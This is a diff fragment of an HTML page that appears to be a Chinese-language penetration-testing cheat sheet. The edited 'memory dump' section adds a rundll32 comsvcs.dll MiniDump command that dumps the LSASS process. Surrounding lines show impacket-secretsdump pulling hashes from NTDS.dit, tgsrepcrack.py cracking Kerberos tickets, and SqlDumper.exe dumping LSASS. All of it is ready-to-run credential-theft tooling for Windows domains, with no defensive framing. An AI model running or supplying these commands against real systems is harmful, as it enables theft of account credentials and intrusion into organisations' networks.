@@ -321,7 +321,9 @@ impacket-secretsdump -system /root/Desktop/NTDS/SYSTEM -ntds /root/ntds.dit LOCA
  python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;
 </code></pre>
 <h1 id="导出内存">导出内存</h1>
-<pre><code>powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full&quot;
+<pre><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 924 C:\lsass.dmp full
+
+powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full&quot;
 #1316是lsass的进程ID。tasklist /svc|findstr lsass
 
 SqlDumper.exe 1316 0 0x01100
